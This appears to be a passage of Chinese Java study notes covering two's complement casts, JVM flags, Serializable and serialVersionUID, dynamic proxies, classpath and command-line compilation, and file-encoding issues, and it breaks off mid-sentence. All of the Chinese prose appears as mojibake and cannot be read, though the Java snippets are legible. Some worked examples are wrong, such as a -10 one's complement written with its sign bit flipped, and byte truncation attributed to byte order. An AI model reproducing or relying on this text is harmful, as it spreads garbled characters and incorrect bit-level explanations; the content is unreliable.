çš„ç›®çš„ï¼šä¸ºäº†ç®€åŒ–è®¡ç®—æœºåŸºæœ¬è¿ç®—ç”µè·¯ï¼Œä½¿åŠ å‡æ³•éƒ½åªéœ€è¦é€šè¿‡åŠ æ³•ç”µè·¯å®ç°ï¼Œä¹Ÿå°±æ˜¯è®©å‡å»ä¸€ä¸ªæ­£æ•°æˆ–åŠ ä¸Šä¸€ä¸ªè´Ÿæ•°è¿™æ ·çš„è¿ç®—å¯ä»¥ç”¨åŠ ä¸Šä¸€ä¸ªæ­£æ•°æ¥ä»£æ›¿ã€‚äºæ˜¯æ”¹å˜è´Ÿæ•°å­˜å‚¨çš„å½¢å¼ï¼Œå­˜å‚¨æˆä¸€ç§å¯ä»¥ç›´æ¥å½“æˆæ­£æ•°æ¥ç›¸åŠ çš„å½¢å¼ï¼Œè¿™ç§å½¢å¼å°±æ˜¯è¡¥ç ã€‚ æ­£æ•°çš„åç è¡¥ç éƒ½æ˜¯åŸç ï¼Œå¦‚ï¼š10åŸç : 1010åç : 1010è¡¥ç ï¼š1010 è´Ÿæ•° -10åŸç  10000000 00000000 00000000 00001010åç (ç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™ä½å–å) 01111111 11111111 11111111 11110101è¡¥ç (åç +1)ï¼š 01111111 11111111 11111111 11110110 æ­£æ•°çš„åç è¡¥ç éƒ½æ˜¯å…¶æœ¬èº« è´Ÿæ•°çš„åç æ˜¯åŸç ç¬¦å·ä½ä¸å˜å…¶ä»–å–åï¼Œè¡¥ç æ˜¯åç +1 System.out.println((byte) 129); System.out.println((byte) -129); System.out.println(&quot;~b2: &quot; + ~10); è¾“å‡ºç»“æœ -127 127 ~b2: -11 å¯¹äº129ï¼ŒäºŒè¿›åˆ¶ä¸º00000000 00000000 00000000 10000001å…¶è¡¥ç ï¼š00000000 00000000 00000000 10000001ç”±äºbyteåªå 1å­—èŠ‚å³8ä½ï¼Œç”±äºå­—èŠ‚åºçš„åŸå› ï¼Œåœ¨å†…å­˜ä¸­åº”è¯¥æ˜¯é¢ å€’è¿‡æ¥çš„ã€‚æ‰€ä»¥ï¼Œä¸Šé¢æˆªå–å8ä½åå¦‚ä¸‹ï¼š10000001æ­¤æ—¶æœ€é«˜ä½ä¸º1å³è´Ÿæ•°ï¼Œè¯¥äºŒè¿›åˆ¶å‡1å³æ˜¯åç åç ï¼š10000000åŸç ï¼š11111111å³-127ï¼Œæ‰€ä»¥(byte)129çš„ç»“æœå°±æ˜¯-127 -129 äºŒè¿›åˆ¶ä¸º10000000 00000000 00000000 10000001å¯¹åº”çš„è¡¥ç ä¸º(åç +1)11111111 11111111 11111111 01111111æˆªå–8ä¸ºåä¸ºï¼š01111111ï¼ˆå› ä¸ºè¿™ä¸ªå°±åœ¨ä½åœ°å€çš„ä½ç½®ï¼‰ä¸ºæ­£æ•°ï¼Œå…¶åŸç åç è¡¥ç å‡ä¸º01111111å³127æ‰€ä»¥(byte)-129çš„ç»“æœå°±æ˜¯127 10çš„äºŒè¿›åˆ¶ä¸º00000000 00000000 00000000 00001010è¡¥ç æ˜¯æœ¬èº«ï¼Œå–åä¹‹åä¸º11111111 11111111 11111111 11110101æ­¤æ—¶æœ€é«˜ä½ä¸º1ï¼Œè´Ÿæ•°ï¼Œå³æ˜¯è´Ÿæ•°çš„è¡¥ç è¯¥åç (è¡¥ç -1)11111111 11111111 11111111 11110100å¯¹åº”çš„åŸç ï¼š10000000 00000000 00000000 00001011 å³-11æ‰€ä»¥~b2çš„ç»“æœæ˜¯-11 36.è°ƒjvmå‚æ•°å…ˆçœ‹æ€ä¹ˆget:åœ¨Intelijé‡Œé¢ï¼Œå†™ä¸€ä¸ªhelloworldç¨‹åºï¼Œçœ‹ä¸‹consoleçš„è¾“å‡ºï¼Œç„¶åå¤åˆ¶å‡ºæ¥ã€‚ä¸­é—´åŠ ä¸Šè¿™ä¹ˆä¸€è¡Œï¼š -XX:+PrintFlagsFinal and -XX:+PrintFlagsInitial æ‰“å°å‡ºæ¥çš„ä¸œè¥¿å¾ˆé•¿ï¼Œåœ¨consoleä¸­ä¸å¥½æ‰¾ï¼Œæœ€å¥½æ‹¿ç®¡é“å¤åˆ¶å‡ºæ¥: XXXXX | clip ã€‚ç„¶ååœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­ç²˜è´´ï¼Œè‡ªå·±æ‰¾æƒ³è¦çš„å‚æ•°æŒ‘å‡ ä¸ªå¥½ç©çš„ï¼š InitialHeapSize = 132120576 MaxJavaStackTraceDepth = 1024 å…·ä½“æ•™ç¨‹æœç´¢æ‰“å°jvmå‚æ•°å³å¯ã€‚ å†çœ‹æ€ä¹ˆset:Intelijé‡Œé¢ï¼ŒSetting-Build-maven-runnerï¼Œæœ‰ä¸ªVM Optionsã€‚æŠŠç½‘ä¸Šæ‰¾åˆ°çš„â€œjvm å‚æ•°ç²˜è´´è¿›å»â€ã€‚æ¯”å¦‚è¿™äº› -Xmx3550m:è®¾ç½®JVMæœ€å¤§å¯ç”¨å†…å­˜ä¸º3550M. -Xms3550m:è®¾ç½®JVMä¿ƒä½¿å†…å­˜ä¸º3550m.æ­¤å€¼å¯ä»¥è®¾ç½®ä¸-Xmxç›¸åŒ,ä»¥é¿å…æ¯æ¬¡åƒåœ¾å›æ”¶å®ŒæˆåJVMé‡æ–°åˆ†é…å†…å­˜. -Xmn2g:è®¾ç½®å¹´è½»ä»£å¤§å°ä¸º2G. 37. Serializableçš„åŸç†åˆšå­¦javaçš„æ—¶å€™æ²¡äººä¼šè·Ÿä½ è®²Serializableä¸ºä»€ä¹ˆæ˜¯ä¸€ä¸ªæ²¡æœ‰æŠ½è±¡æ–¹æ³•çš„æ¥å£ï¼Œé‚£æ—¶ç”šè‡³ä¸çŸ¥é“serializeå’Œdeserializeæ˜¯æ€ä¹ˆå›äº‹ã€‚å…³äºSerializableä¸»è¦çš„ç‚¹æœ‰å‡ ä¸ªï¼š ä¸ºä»€ä¹ˆä¸€ä¸ªæ²¡æœ‰æŠ½è±¡æ–¹æ³•çš„æ¥å£ä¹Ÿèƒ½ç®—æ¥å£ ä¸ºä»€ä¹ˆæ€»æ˜¯è¯´åºåˆ—åŒ–ä¸€å®šè¦å®ç°serializableæ¥å£ é‚£ä¸ªserialVersionUIDå¹²ä»€ä¹ˆç”¨çš„ ä¸ºä»€ä¹ˆå†™äº†transientå°±ä¸ä¼šè¢«åºåˆ—åŒ–äº†ã€‚ ç°åœ¨å›ç­”ä¸‹è¿™äº›é—®é¢˜ï¼Œserializeï¼ˆåºåˆ—åŒ–ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å†™è¿›ç£ç›˜ï¼‰ï¼Œdeserializeï¼ˆååºåˆ—åŒ–ï¼Œå°±æ˜¯æŠŠå†™åœ¨ç£ç›˜ä¸Šçš„0110è¿™äº›ä¸œè¥¿é‡æ–°ç»„è£…æˆä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚ public interface Serializable { } private static final long serialVersionUID = 2906642554793891381L; // ç½‘ä¸Šéšä¾¿æ‰¾åˆ°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„demoå¦‚ä¸‹ // Serializableï¼šæŠŠå¯¹è±¡åºåˆ—åŒ– public static void writeSerializableObject() { try { Man man = new Man(&quot;lat&quot;, &quot;123456&quot;); Person person = new Person(man, &quot;ç‹å°¼ç›&quot;, 21); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;output.txt&quot;)); objectOutputStream.writeObject(&quot;string&quot;); objectOutputStream.writeObject(person); objectOutputStream.close(); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } // Serializableï¼šååºåˆ—åŒ–å¯¹è±¡ public static void readSerializableObject() { try { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;output.txt&quot;)); String string = (String) objectInputStream.readObject(); Person person = (Person) objectInputStream.readObject(); objectInputStream.close(); System.out.println(string + &quot;, age: &quot; + person.getAge() + &quot;, man username: &quot; + person.getMan().getUsername()); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (Exception e) { e.printStackTrace(); } } ä¸ºä»€ä¹ˆè¯´åºåˆ—åŒ–ä¸€å®šè¦å®ç°serializableæ¥å£ã€‚ä¸Šé¢çš„objectOutputStream.writeObjectæ–¹æ³•èµ°è¿›å»ã€‚ObjectOutputStream.java public final void writeObject(Object obj) throws IOException { if (enableOverride) { writeObjectOverride(obj); return; } try { writeObject0(obj, false); } catch (IOException ex) { if (depth == 0) { writeFatalException(ex); } throw ex; } } private void writeObject0(Object obj, boolean unshared) throws IOException{ // çœç•¥çœç•¥ // remaining cases if (obj instanceof String) { writeString((String) obj, unshared); } else if (cl.isArray()) { writeArray(obj, desc, unshared); } else if (obj instanceof Enum) { writeEnum((Enum&lt;?&gt;) obj, desc, unshared); } else if (obj instanceof Serializable) { writeOrdinaryObject(obj, desc, unshared); } else { if (extendedDebugInfo) { throw new NotSerializableException( cl.getName() + &quot;\\n&quot; + debugInfoStack.toString()); } else { throw new NotSerializableException(cl.getName()); } } // çœç•¥çœç•¥ } æœç„¶è¿˜æ˜¯ç”¨äº†instanceofè¿™ä¸ªå…³é”®è¯å•Šã€‚è¿™æ˜¯å†™è¿›ç£ç›˜(serializeçš„æƒ…å†µ)ï¼Œä»ç£ç›˜é‡Œå–å‡ºæ¥çš„è¯ObjecInputStream.java public final Object readObject(){ // çœç•¥ Object obj = readObject0(false); // çœç•¥ } /** * Underlying readObject implementation. */ private Object readObject0(boolean unshared) throws IOException { // çœç•¥ case TC_OBJECT: return checkResolve(readOrdinaryObject(unshared)); // çœç•¥ } private Object readOrdinaryObject(boolean unshared){ //çœç•¥ try { obj = desc.isInstantiable() ? desc.newInstance() : null; } catch (Exception ex) { throw (IOException) new InvalidClassException( desc.forClass().getName(), &quot;unable to create instance&quot;).initCause(ex); } //çœç•¥ } å°±æ˜¯åå°„è°ƒç”¨æ— å‚çš„æ„é€ å‡½æ•°ã€‚ ä»¥å‰æˆ‘é—®è¿‡é‚£ä¸ªserialVersionUIDæ˜¯å¹²ä»€ä¹ˆçš„ï¼Œæ€ä¹ˆå†™ï¼Œè€æ‰‹å‘Šè¯‰æˆ‘è¯´ï¼Œçå†™å°±è¡Œäº†ã€‚åæ¥çš„é¡¹ç›®ä¸­å°±ä¸€ç›´çå†™äº†ï¼Œå€’ä¹Ÿæ²¡å‡ºè¿‡ä»€ä¹ˆé—®é¢˜ã€‚ç°åœ¨æ¥å›ç­”è¿™ä¸ªserialVersionUIDæ˜¯å¹²ä»€ä¹ˆçš„ï¼šåºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±æ˜¯å­˜è¿›å»å’Œå–å‡ºæ¥ï¼Œä¸ºäº†ä¿è¯å­˜è¿›ç£ç›˜çš„Aåœ¨å–å‡ºæ¥çš„æ—¶å€™ä¸ä¼šå»æ‹¿Bçš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦è¿™ä¸ªã€‚è¿™ä¸ªå€¼å°±ç›¸å½“äºæ¯ä¸€ä¸ªå­˜è¿›å»çš„classçš„èº«ä»½è¯å·ï¼Œä¿è¯å­˜è¿›å»å’Œå–å‡ºæ¥çš„æ˜¯ä¸€ä¸ªä¸œè¥¿ã€‚ObjectStreamClass.java private static Long getDeclaredSUID(Class&lt;?&gt; cl) { try { Field f = cl.getDeclaredField(&quot;serialVersionUID&quot;); int mask = Modifier.STATIC | Modifier.FINAL; if ((f.getModifiers() &amp; mask) == mask) { f.setAccessible(true); return Long.valueOf(f.getLong(null)); } } catch (Exception ex) { } return null; } å‡å¦‚å¿˜è®°å†™çš„è¯ï¼Œå‘µå‘µ throw new InvalidClassException(osc.name, &quot;local class incompatible: &quot; + &quot;stream classdesc serialVersionUID = &quot; + suid + &quot;, local class serialVersionUID = &quot; + osc.getSerialVersionUID()); æ²¡æœ‰æŒ‡å®šserialVersionUIDçš„ï¼Œé‚£ä¹ˆjavaç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç»™è¿™ä¸ªclassè¿›è¡Œä¸€ä¸ªæ‘˜è¦ç®—æ³•ï¼Œç±»ä¼¼äºæŒ‡çº¹ç®—æ³•ï¼Œåªè¦è¿™ä¸ªæ–‡ä»¶å¤šä¸€ä¸ªç©ºæ ¼ï¼Œå¾—åˆ°çš„UIDå°±ä¼šæˆªç„¶ä¸åŒçš„ï¼Œå¯ä»¥ä¿è¯åœ¨è¿™ä¹ˆå¤šç±»ä¸­ï¼Œè¿™ä¸ªç¼–å·æ˜¯å”¯ä¸€çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå­—æ®µåï¼Œç”±äºæ²¡æœ‰æ˜¾æŒ‡å®šserialVersionUIDï¼Œç¼–è¯‘å™¨åˆä¸ºæˆ‘ä»¬ç”Ÿæˆäº†ä¸€ä¸ªUIDï¼Œå½“ç„¶å’Œå‰é¢ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„é‚£ä¸ªä¸ä¼šä¸€æ ·äº†ï¼Œäºæ˜¯å°±å‡ºç°äº†2ä¸ªå·ç ä¸ä¸€è‡´çš„é”™è¯¯ã€‚å› æ­¤ï¼Œåªè¦æˆ‘ä»¬è‡ªå·±æŒ‡å®šäº†serialVersionUIDï¼Œå°±å¯ä»¥åœ¨åºåˆ—åŒ–åï¼Œå»æ·»åŠ ä¸€ä¸ªå­—æ®µï¼Œæˆ–è€…æ–¹æ³•ï¼Œè€Œä¸ä¼šå½±å“åˆ°åæœŸçš„è¿˜åŸï¼Œè¿˜åŸåçš„å¯¹è±¡ç…§æ ·å¯ä»¥ä½¿ç”¨ï¼Œè€Œä¸”è¿˜å¤šäº†æ–¹æ³•å¯ä»¥ç”¨ æ‰€ä»¥è¿˜æ˜¯å¾—è€è€å®å®å†™ï¼Œè€Œä¸”ä¸€æ¬¡å†™äº†ä¹‹åå°±ä¸ç”¨ä¹Ÿä¸è¦æ”¹äº†ç°åœ¨å¯ä»¥ä¸ç”¨çå†™äº†ï¼Œåœ¨Intelijé‡Œé¢æœ‰å°å·¥å…·ï¼š &quot;File-&gt;Setting-&gt;Editor-&gt;Inspections-&gt;Serialization issues-&gt;Serializable class without â€™serialVersionUIDâ€™ -&gt;å‹¾é€‰æ“ä½œ&quot; å¦å¤–,serializationæ˜¯å¾ˆå·®åŠ²çš„è®¾è®¡ï¼Œä¸»è¦æ˜¯å› ä¸ºå®‰å…¨æ€§ä¸Šçš„é—®é¢˜ï¼Œè¿˜ä¸å¦‚ä½¿ç”¨json. 40. å…³äºåŠ¨æ€ä»£ç†(InvocationHandlerè¿™ä¸€å¥—)åŠ¨æ€ä»£ç†ã€‚ System.getProperties().put(â€œsun.misc.ProxyGenerator.saveGeneratedFilesâ€, â€œtrueâ€); åŠ¨æ€åŸç†çš„newProxyInstanceæœ€ç»ˆè°ƒç”¨åˆ°äº†defineClass0,å°±æ˜¯æ ¹æ®ä»£ç†ç±»çš„å­—èŠ‚ç ç”Ÿæˆä»£ç†ç±»çš„å®ä¾‹ï¼ˆå°±æ˜¯éå†ç›®æ ‡ç±»å®ç°çš„æ¥å£ï¼Œç”Ÿæˆä»£ç†ç±»çš„å­—èŠ‚ç byte[]ï¼‰ ç”Ÿæˆçš„classæ–‡ä»¶æœ€ç»ˆåœ¨æ‰§è¡Œè¯¥æ–¹æ³•çš„æ—¶å€™è°ƒç”¨çš„InvocationHandlerçš„invokeæ–¹æ³•ï¼Œä»…æ­¤è€Œå·² 41. java ioä¸»è¦æ˜¯è£…é¥°æ¨¡å¼ï¼Œå¦å¤–ï¼Œè°ƒç”¨æ“ä½œç³»ç»Ÿapiå®ç°è¯»å†™æ–‡ä»¶çš„åŠŸèƒ½åœ¨FileInputStreamå’ŒFilePutputStreamé‡Œé¢ï¼Œä¸»è¦çš„nativeæ–¹æ³•éƒ½åœ¨è¿™é‡Œé¢ï¼ŒFileDescriptorçš„ä½¿ç”¨ä¹Ÿåœ¨è¿™é‡Œé¢ // FileInputStream.java private native int read0() throws IOException; private native int readBytes(byte b[], int off, int len) throws IOException; private native void close0() throws IOException; //FileOutputStream.java private native void write(int b, boolean append) throws IOException; private native void writeBytes(byte b[], int off, int len, boolean append) throws IOException; private native void close0() throws IOException; 42. Using java from command line interfaceå¹³æ—¶éƒ½è¢«IDEå® åäº†ï¼Œä¹ æƒ¯äº†ç”¨Intelij Ideaè·‘java ç¨‹åºï¼Œå¦‚æœç”¨å‘½ä»¤è¡Œå‘¢ï¼Ÿ java -h ä¼šå‘Šè¯‰æˆ‘ä»¬å¯ä»¥é€šè¿‡java commandä¼ é€’çš„å‚æ•°ã€‚çœ‹äº†ä¸‹Intelij Ideaç‚¹å‡»runçš„æ—¶å€™åšäº†ä»€ä¹ˆ: é¦–å…ˆæ˜¯ä¸€é—ªè€Œè¿‡çš„compilingâ€¦..(å…¶å®å°±æ˜¯è·‘javacäº†)ï¼Œç„¶ååœ¨consoleé‡Œé¢å¼€å§‹è¾“å‡ºï¼šâ€java.exeçš„ç»å¯¹è·¯å¾„â€ â€œ-javaagent:xxx.jarâ€ -Dfile.encoding=UTF-8 -classpath â€œ/jre/lib/A.jar;/jre/lib/B.jar;â€¦..;/target/classes(è¿™ä¸ªæ˜¯ideåœ¨å½“å‰é¡¹ç›®ç›®å½•ä¸‹åˆ›å»ºçš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æŒ‰ç…§åŒ…åç»“æ„æ”¾äº†å¯¹åº”çš„classæ–‡ä»¶);C:/users/administrator/.m2/repository/com.xxx.xxx.jar;â€¦â€¦â€ com.example.sample java - hè¯´ -D&lt;åç§°&gt;=&lt;å€¼&gt; è®¾ç½®ç³»ç»Ÿå±æ€§-javaagent:[=&lt;é€‰é¡¹&gt;] åŠ è½½ Java ç¼–ç¨‹è¯­è¨€ä»£ç†, è¯·å‚é˜… java.lang.instrument-classpath &lt;ç›®å½•å’Œ zip/jar æ–‡ä»¶çš„ç±»æœç´¢è·¯å¾„&gt;ç”¨ ; åˆ†éš”çš„ç›®å½•, JAR æ¡£æ¡ˆå’Œ ZIP æ¡£æ¡ˆåˆ—è¡¨, ç”¨äºæœç´¢ç±»æ–‡ä»¶ã€‚ è®°ä½,javacåªæ˜¯ä¸€ä¸ªutlity that comes with JDK é”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±»ä¸¤ç§æ­£ç¡®çš„æ–¹æ¡ˆæ˜¯ï¼š javaæ–‡ä»¶ä¸­ä¸å†™packagename!ä¸å†™packagename!ä¸å†™packagename! public class Demo { public static void main(String[] args) { System.out.println(&quot;Hello there&quot;); } } ç„¶åå‘½ä»¤è¡Œjavac Demo.java -&gt; java Demo -&gt; Hello there javaæ–‡ä»¶å†™ä¸ŠpackageName package com.me.example; public class Demo2 { public static void main(String[] args) { System.out.println(&quot;Hello there&quot;); } } ç„¶åjavac Demo2.java -&gt; java Demo2 -&gt; é”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±» com.me.example.Demo2åº”è¯¥javac Demo2.java -&gt; æŠŠç”Ÿæˆçš„Demo2.classç²˜è´´åˆ°å½“å‰ç›®å½•ä¸‹æ–°å»ºçš„ä¸€ä¸ªcom/me/exampleæ–‡ä»¶å¤¹ä¸‹ -&gt; java/com/me/example/Demo2 -&gt; Hello there éè¦æŠŠå¸¦packagenameçš„javaæ–‡ä»¶å†™åœ¨src/com/me/exampleæ–‡ä»¶å¤¹ä¸‹ï¼Ÿå¥½å•Š`javapackage com.me.example; public class Demo3 { public static void main(String[] args) { System.out.println(â€œHello thereâ€); }} åœ¨src/com/me.exampleæ–‡ä»¶å¤¹ä¸‹æ•²å‘½ä»¤ï¼š javac Demo3 -&gt; æŠŠç”Ÿæˆçš„Demo3.classç²˜è´´åˆ°src/com/me/example/com/me/exampleæ–‡ä»¶å¤¹ä¸‹ -&gt; java com/me/example/Demo3 4. javaæ–‡ä»¶è¿˜æ”¾åœ¨src/com/me/exampleæ–‡ä»¶å¤¹ä¸‹ï¼Œä¸åŠ packageNameæ€»èƒ½è¡Œäº†å§ ```java public class Demo4 { public static void main(String[] args) { System.out.println(&quot;Hello there&quot;); } } javac Demo4.java -&gt; java Demo4.class -&gt; â€œHello thereâ€æœ€ç»ˆçš„ç»“æ„æ˜¯æ¯ä¸€ä¸ªA.javaæ–‡ä»¶æ—è¾¹éƒ½è·Ÿç€ä¸€ä¸ªA.classæ–‡ä»¶ å‘½ä»¤è¡Œé‡Œå†™javaä»£ç è¿™ç¯‡æ–‡ç« å‘Šè¯‰æˆ‘ä»¬ï¼Œæ²¡æœ‰IDEä¹Ÿèƒ½å†™javaä»£ç ã€‚äº²æµ‹ï¼Œç”¨vs codeå†™ä»£ç ä¹Ÿä¸ç®—å·®ã€‚æ–‡ç« çš„å¤§è‡´å†…å®¹å¦‚ä¸‹:å‡å®šå½“å‰é¡¹ç›®ç›®å½•ç»“æ„å¦‚ä¸‹: /bin ##ç”¨äºå­˜å‚¨å®‰è£…ç”Ÿæˆçš„.classæ–‡ä»¶ /lib ## ç”¨äºæ”¾ç¬¬ä¸‰æ–¹jaræ–‡ä»¶ /Okio.jar /src ## ç”¨äºå­˜æ”¾å¼€å‘å†™çš„javaæ–‡ä»¶ /com /example /Application.java package com.example; import java.io.*; import okio.BufferedSource; import okio.Okio; public class Application { public static void main(String[] args) { print(&quot;Hello there&quot;); File info = new File(&quot;info.txt&quot;); FileReader reader = null; BufferedReader bufferedReader = null; try { BufferedSource source = null; source = Okio.buffer(Okio.source(info)); // bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(info), &quot;UTF-8&quot;)); String line = &quot;&quot;; while ((line = source.readUtf8Line()) != null) { // print(new String(line.getBytes(&quot;GBK&quot;), &quot;UTF-8&quot;)); print(line); } } catch (Exception e) { //TODO: handle exception e.printStackTrace(); } } static void print(String out) { System.out.println(out); } } æ³¨æ„ä¸Šé¢çš„javaæ–‡ä»¶ç¬¬ä¸€è¡Œæ˜¯æœ‰package nameå£°æ˜çš„ã€‚é¦–å…ˆcdåˆ°æ ¹ç›®å½•ä¸‹ javac -d bin -sourcepath src -cp lib/Okio.jar;lib/gson.jar src/com/example/Application.java -dçš„æ„æ€æ˜¯destination, sourcepathå°±æ˜¯æºç è·¯å¾„ ï¼Œ -cpå…¶å®å’Œ-classpathä¸€æ · binç›®å½•ä¸‹å°±ä¼šç”Ÿæˆcom/example/Application.classæ–‡ä»¶ï¼Œè¿™ä¸­é—´çš„æ–‡ä»¶å±‚çº§ä¹Ÿç”Ÿæˆå¥½äº†ã€‚è¿˜æ˜¯åœ¨æ ¹ç›®å½•ä¸‹ java -cp bin;lib/Okio.jar com.example.Application è¿è¡Œçš„æ—¶å€™è¦å¸¦ä¸Šclasspath,ä¸ç„¶ä¼šå‡ºç°classnotFoundéœ€è¦æ³¨æ„çš„æ˜¯ä»£ç ä¸­å¼•ç”¨çš„æ–‡ä»¶è·¯å¾„æŒ‡çš„æ˜¯ä½ å½“å‰æ‰€åœ¨çš„è·¯å¾„ï¼Œæ‰€ä»¥ï¼Œæƒ³è¦é¿å…FileNotFoundçš„è¯ï¼Œéœ€è¦åœ¨å½“å‰é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹æ”¾ä¸€ä¸ªâ€info.txtâ€æ–‡ä»¶ã€‚å…¶å®ç«™åœ¨ä¸€ä¸ªcommandçš„è§’åº¦æ¥çœ‹ï¼Œè¿™ä¹Ÿæ­£å¸¸ï¼Œå¤–éƒ¨å¹¶æœªç‰¹æ„å£°æ˜å·¥ä½œè·¯å¾„ï¼Œæ‰€ä»¥jvmè¿è¡Œclassæ–‡ä»¶æ—¶å°±æ˜¯åœ¨å½“å‰çš„ç›®å½•ä¸‹è¿›è¡Œçš„ã€‚ Some Notes About Classpathï¼Œå…³äºclasspathçš„è¯´æ˜ã€‚å¾ˆå¤šç½‘ä¸Šçš„æ•™ç¨‹éƒ½è¯´å»è‡ªå·±ç”µè„‘çš„ç¯å¢ƒå˜é‡æ”¹CLASSPATHè¿™ä¸ªå€¼ï¼Œæƒ³çœ‹ä¸‹å½“å‰æ˜¯ä»€ä¹ˆæ ·çš„è¯ echo %CLASSPATH%javacç¼–è¯‘å™¨åœ¨ç¼–Application.javaè¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œé‡åˆ°äº†com.example.Utilè¿™ä¸ªclassï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨å“ªï¼Ÿæ ¹æ®javaå‘½åè§„åˆ™ï¼Œè¿™ä¸ªclassåº”è¯¥åœ¨../com/example/è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ã€‚é‚£ä¹ˆè¿™ä¸ªè·¯å¾„ä»å“ªé‡Œå¼€å§‹ï¼Œå°±æ˜¯è®©javacæŠŠå“ªä¸ªç»å¯¹è·¯å¾„å½“åšæ ¹è·¯å¾„ï¼Ÿä¸‰ç§æ–¹å¼: If no â€“classpath parameter is passed, CLASSPATH environment variable is usedIf CLASSPATH environment variable is not found, current folder (â€œ.â€) is used by defaultIf â€“classpath is explicitly set as a command line parameter, it overrides all other values java -cp bin;lib/Okio.jar com.example.Application è¿è¡Œçš„æ—¶å€™éœ€è¦å¸¦ä¸Šbinè¿™ä¸ªclasspathçš„åŸå› æ˜¯è®¾å®šäº†classpathå°±ä¼šè¦†ç›–æ‰å…¶ä»–è®¾å®šï¼Œæ‰€ä»¥è¦æŠŠæˆ‘ä»¬è‡ªå·±çš„javaæ–‡ä»¶æ‰“å‡ºæ¥çš„classæ–‡ä»¶ä¹ŸåŠ åˆ°classpathã€‚è¿˜æœ‰è¦æ³¨æ„çš„æ˜¯ï¼Œunixç³»ç»Ÿä¸Šclasspathä¹‹é—´æ˜¯ç”¨:åˆ†å‰²çš„ï¼Œwindowsä¸Šæ˜¯ç”¨;åˆ†å‰²çš„ ä¸Šè¿°åªæ˜¯ç¼–è¯‘è¿è¡Œä¸€ä¸ªjavaæ–‡ä»¶ï¼Œå®é™…é¡¹ç›®æœ‰å¤šä¸ªjavaæ–‡ä»¶çš„è¯ï¼Œéœ€è¦å‡†å¤‡ä¸€ä¸ªMANIFEST.MFæ–‡ä»¶ï¼ˆæä¾›å…¥å£å‡½æ•°ï¼‰å†™ä¸€ä¸ªshellè„šæœ¬å¥½äº† ã€‚å®é™…ä¸Šç”Ÿäº§ä¸­ä½¿ç”¨çš„éƒ½æ˜¯mvnè¿™ç§äº†ï¼Œè¿™é‡Œåªæ˜¯è§£é‡Šä¸‹åŸç†ã€‚ 43 . javaè¯»æ–‡ä»¶ä¹Ÿè¦æ³¨æ„ç¼–ç é—®é¢˜(FileReaderè¯»å–æ–‡ä»¶é‡Œæ–‡ä¹±ç é—®é¢˜)import java.io.*; public class Sample { public static void main(String[] args) { print(&quot;Hello there&quot;); File info = new File(&quot;info.txt&quot;); FileReader reader = null; BufferedReader bufferedReader = null; try { reader = new FileReader(info); bufferedReader = new BufferedReader(reader); // bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(info), &quot;UTF-8&quot;)); String line = &quot;&quot;; while ((line = bufferedReader.readLine()) != null) { print(new String(line.getBytes(&quot;GBK&quot;), &quot;UTF-8&quot;)); //è¿™æ ·è¾“å‡ºå¤§éƒ¨åˆ†æ­£ç¡®ï¼Œä½†æ˜¯å¸¦äº†ä¸€äº›ä¹±ç ï¼Œæ˜¾ç¤ºæˆé—®å· // print(line); æ”¹ç”¨utf-8æ„é€ å‡½æ•°çš„InputStreamReaderä¹‹åï¼Œç›´æ¥printå‡ºæ¥å°±ä¸æ¯«ä¸å·®äº† } } catch (Exception e) { //TODO: handle exception e.printStackTrace(); } } static void print(String out) { System.out.println(out); } } åŸç†çš„è¯ï¼Œæ–‡ä»¶è¯»å…¥æ—¶æ˜¯æŒ‰OSçš„é»˜è®¤å­—ç¬¦é›†å³GBKè§£ç çš„ï¼Œwindowsä¸Šé»˜è®¤æ˜¯GBK(ä¸­æ–‡çš„win10)ï¼ŒString.getBytes(â€œGBKâ€)å°±æ˜¯æŠŠæŒ‰ç…§GBKç¼–ç çš„å†…å®¹è¿˜åŸæˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå†ç”¨UTF-8å»new Stringï¼Œç…§è¯´æ²¡é—®é¢˜ï¼Œç»“æœå¤§éƒ¨åˆ†æ±‰å­—æ˜¾ç¤ºå‡ºæ¥ï¼Œä½†æ˜¯éƒ¨åˆ†æ±‰å­—åé¢è·Ÿç€é—®å·ã€‚åŸå› çš„è¯ï¼ŒFileReaderç»§æ‰¿äº†InputStreamReaderï¼Œæ²¡æœ‰å®ç°InputStreamReaderçš„å¸¦charsetçš„æ„é€ å‡½æ•°ã€‚FileReaderå±äºå­—ç¬¦æµï¼Œæ˜¯è¯»å–å­—ç¬¦æ–‡ä»¶çš„ä¾¿æ·ç±»ã€‚å…¶ç»§æ‰¿è‡ªInputStreamReaderï¼Œåè€…æ˜¯å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦æµçš„çš„æ¡¥æ¢ï¼Œå³å°†å­—èŠ‚ä¿¡æ¯è½¬æ¢ä¸ºå­—ç¬¦ä¿¡æ¯ã€‚å®é™…ä¸Šï¼Œ 